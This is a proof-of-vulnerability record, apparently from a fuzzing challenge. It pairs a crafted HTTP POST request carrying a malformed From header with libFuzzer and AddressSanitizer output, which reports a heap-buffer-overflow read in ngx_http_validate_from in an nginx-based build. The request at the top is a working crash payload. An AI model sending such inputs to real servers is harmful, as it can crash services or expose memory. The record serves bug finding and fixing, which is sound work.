
POST / HTTP/1.1
Host: localhost
From: a..@a..@....a@a.a@...@example.com.a@invalid\
      ..@repeated..@characters@intensify@pressure@intentionally\
      ..@breaking@out_of_bounds@exploit.payload
Content-Length: 0

// The following is input by injecting Blobs above
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3434121613
INFO: Loaded 1 modules   (80 inline 8-bit counters): 80 [0x56211ac5ad78, 0x56211ac5adc8), 
INFO: Loaded 1 PC tables (80 PCs): 80 [0x56211ac5adc8,0x56211ac5b2c8), 
/out/pov_harness: Running 1 inputs 100 time(s) each.
Running: /work/tmp_blob
=================================================================
==39==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5040000024cf at pc 0x56211aa1d784 bp 0x7ffc69a24bb0 sp 0x7ffc69a24ba8
READ of size 1 at 0x5040000024cf thread T0
    #0 0x56211aa1d783 in ngx_http_validate_from /src/harnesses/bld/src/http/ngx_http_request.c:4093:25
    #1 0x56211aa1d783 in ngx_http_process_from /src/harnesses/bld/src/http/ngx_http_request.c:4170:9
    #2 0x56211aa2c15a in ngx_http_process_request_headers /src/harnesses/bld/src/http/ngx_http_request.c:1499:23
    #3 0x56211a9c1bdc in ngx_event_process_posted /src/harnesses/bld/src/event/ngx_event_posted.c:34:9
    #4 0x56211a95ca37 in LLVMFuzzerTestOneInput /src/harnesses/bld/src/harnesses/pov_harness.cc:323:5
    #5 0x56211a80e780 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #6 0x56211a7f8f14 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
    #7 0x56211a7fe9aa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
    #8 0x56211a82ada2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #9 0x7efdfc502082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0702430aef5fa3dda43986563e9ffcc47efbd75e)
    #10 0x56211a7ef9ed in _start (/out/pov_harness+0xb59ed)

0x5040000024cf is located 1 bytes before 44-byte region [0x5040000024d0,0x5040000024fc)
allocated by thread T0 here:
    #0 0x56211a91cd1e in malloc /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:69:3
    #1 0x56211a9cd5f4 in ngx_alloc /src/harnesses/bld/src/os/unix/ngx_alloc.c:22:9
    #2 0x56211a9647eb in ngx_palloc_large /src/harnesses/bld/src/core/ngx_palloc.c:220:9
    #3 0x56211aa1d359 in ngx_http_validate_from /src/harnesses/bld/src/http/ngx_http_request.c:4060:13
    #4 0x56211aa1d359 in ngx_http_process_from /src/harnesses/bld/src/http/ngx_http_request.c:4170:9
    #5 0x56211aa2c15a in ngx_http_process_request_headers /src/harnesses/bld/src/http/ngx_http_request.c:1499:23
    #6 0x56211a9c1bdc in ngx_event_process_posted /src/harnesses/bld/src/event/ngx_event_posted.c:34:9
    #7 0x56211a95ca37 in LLVMFuzzerTestOneInput /src/harnesses/bld/src/harnesses/pov_harness.cc:323:5
    #8 0x56211a80e780 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #9 0x56211a7f8f14 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
    #10 0x56211a7fe9aa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
    #11 0x56211a82ada2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #12 0x7efdfc502082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0702430aef5fa3dda43986563e9ffcc47efbd75e)

SUMMARY: AddressSanitizer: heap-buffer-overflow /src/harnesses/bld/src/http/ngx_http_request.c:4093:25 in ngx_http_validate_from
Shadow bytes around the buggy address:
  0x504000002200: fa fa 00 00 00 00 00 fa fa fa fd fd fd fd fd fa
  0x504000002280: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa
  0x504000002300: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa
  0x504000002380: fa fa 00 00 00 00 00 04 fa fa 00 00 00 00 00 00
  0x504000002400: fa fa 00 00 00 00 00 00 fa fa 00 00 00 00 00 06
=>0x504000002480: fa fa 00 00 00 00 00 00 fa[fa]00 00 00 00 00 04
  0x504000002500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x504000002580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x504000002600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x504000002680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x504000002700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==39==ABORTING
libfuzzer exit=1